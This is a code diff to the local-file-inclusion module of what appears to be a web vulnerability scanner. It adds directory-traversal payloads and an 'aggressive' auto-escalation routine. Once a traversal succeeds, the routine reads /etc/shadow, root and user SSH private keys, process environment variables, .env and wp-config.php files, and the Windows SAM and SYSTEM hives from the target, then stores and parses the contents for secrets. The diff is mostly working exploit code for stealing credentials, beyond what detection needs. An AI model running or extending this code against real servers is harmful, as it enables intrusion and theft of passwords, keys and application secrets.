@@ -73,15 +73,15 @@ class LfiModule(BaseModule):
         return found if found else params
     
     async def _test_basic_traversal(self, target, params):
-        traversals = [
+        file_payloads = self.get_payloads("lfi")
+        traversals = list(dict.fromkeys((file_payloads or []) + [
             "../../../../../../../etc/passwd",
             "..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
             "/etc/passwd",
             "c:/windows/win.ini",
             "....//....//....//....//etc/passwd",
             "..%2f..%2f..%2f..%2f..%2fetc/passwd",
-        ]
-        
+        ]))[:120]
         for param in params:
             for payload in traversals:
                 resp = await self.test_param(target, param, payload)
@@ -94,8 +94,14 @@ class LfiModule(BaseModule):
                             f"Local File Inclusion ({os_type})",
                             url=target,
                             parameter=param,
-                            evidence=f"Payload: {payload}"
+                            evidence=f"Payload: {payload}",
+                            confidence_evidence=["file_content_verified", f"{os_type}_patterns_matched"],
+                            request_data={"method": "GET", "url": target, "param": param, "payload": payload}
                         )
+                        
+                        if self.aggressive:
+                            await self._auto_escalate(target, param, payload, os_type)
+                        
                         return
     
     async def _test_encoded_traversal(self, target, params):
@@ -175,6 +181,97 @@ class LfiModule(BaseModule):
                 if re.search(pattern, text, re.IGNORECASE):
                     return os_type
         return None
+    
+    async def _auto_escalate(self, target, param, working_payload, os_type):
+        if not hasattr(self, "escalation_results"):
+            self.escalation_results = {"files_read": {}, "secrets_found": [], "ssh_keys": [], "users": []}
+        
+        traversal_prefix = working_payload.rsplit("/etc/passwd", 1)[0] if "/etc/passwd" in working_payload else working_payload.rsplit("\\windows\\win.ini", 1)[0]
+        
+        if os_type == "linux":
+            escalation_chain = [
+                ("/etc/shadow", "password_hashes", "CRITICAL"),
+                ("/etc/sudoers", "sudo_config", "HIGH"),
+                ("/root/.ssh/id_rsa", "root_ssh_key", "CRITICAL"),
+                ("/root/.ssh/authorized_keys", "root_authorized_keys", "HIGH"),
+                ("/root/.bash_history", "root_history", "MEDIUM"),
+                ("/home/*/.ssh/id_rsa", "user_ssh_key", "CRITICAL"),
+                ("/proc/self/environ", "environment_vars", "HIGH"),
+                ("/var/www/html/.env", "app_secrets", "CRITICAL"),
+                ("/var/www/html/wp-config.php", "wp_config", "CRITICAL"),
+                ("/var/www/html/config.php", "app_config", "CRITICAL"),
+                ("/etc/mysql/my.cnf", "mysql_config", "MEDIUM"),
+                ("/etc/postgresql/*/main/pg_hba.conf", "postgres_config", "MEDIUM"),
+            ]
+        else:
+            escalation_chain = [
+                ("c:/windows/repair/sam", "sam_database", "CRITICAL"),
+                ("c:/windows/repair/system", "system_hive", "CRITICAL"),
+                ("c:/inetpub/wwwroot/web.config", "web_config", "CRITICAL"),
+                ("c:/windows/system32/config/sam", "sam_live", "CRITICAL"),
+                ("c:/users/administrator/.ssh/id_rsa", "admin_ssh", "CRITICAL"),
+                ("c:/xampp/htdocs/.env", "app_secrets", "CRITICAL"),
+            ]
+        
+        for filepath, file_type, severity in escalation_chain:
+            if "*" in filepath:
+                continue
+            
+            clean_path = filepath.lstrip("/").replace("c:/", "").replace("C:/", "")
+            payload = f"{traversal_prefix}/{clean_path}" if traversal_prefix.endswith("/") else f"{traversal_prefix}{clean_path}"
+            
+            resp = await self.test_param(target, param, payload)
+            
+            if resp.get("status") == 200 and resp.get("text"):
+                content = resp["text"]
+                
+                if self._is_valid_file_content(content, file_type):
+                    self.escalation_results["files_read"][filepath] = content[:2000]
+                    
+                    if "ssh" in file_type and "PRIVATE KEY" in content:
+                        self.escalation_results["ssh_keys"].append({
+                            "file": filepath,
+                            "key_preview": content[:100]
+                        })
+                    
+                    secrets = self._extract_secrets(content)
+                    self.escalation_results["secrets_found"].extend(secrets)
+                    
+                    self.add_finding(
+                        severity,
+                        f"LFI Escalation: {file_type} extracted",
+                        url=target,
+                        parameter=param,
+                        evidence=f"File: {filepath} ({len(content)} bytes)",
+                        confidence_evidence=["escalation_successful", f"{file_type}_extracted"],
+                        request_data={"method": "GET", "url": target, "param": param, "payload": payload}
+                    )
+        
+        if self.escalation_results["files_read"]:
+            self.add_exploit_data("lfi_escalation", self.escalation_results)
+    
+    def _is_valid_file_content(self, content, file_type):
+        if len(content) < 10:
+            return False
+        
+        if "404" in content.lower() and "not found" in content.lower():
+            return False
+        
+        validators = {
+            "password_hashes": lambda c: ":" in c and ("$" in c or "!" in c),
+            "root_ssh_key": lambda c: "PRIVATE KEY" in c,
+            "user_ssh_key": lambda c: "PRIVATE KEY" in c,
+            "root_authorized_keys": lambda c: "ssh-" in c,
+            "environment_vars": lambda c: "=" in c and ("PATH" in c or "HOME" in c),
+            "app_secrets": lambda c: "=" in c or ":" in c,
+            "wp_config": lambda c: "DB_" in c or "define(" in c,
+            "app_config": lambda c: "$" in c or "=" in c,
+            "sam_database": lambda c: len(c) > 100,
+            "web_config": lambda c: "<configuration" in c or "connectionString" in c.lower(),
+        }
+        
+        validator = validators.get(file_type, lambda c: len(c) > 20)
+        return validator(content)
     
     def _check_base64_php(self, text):
         try:
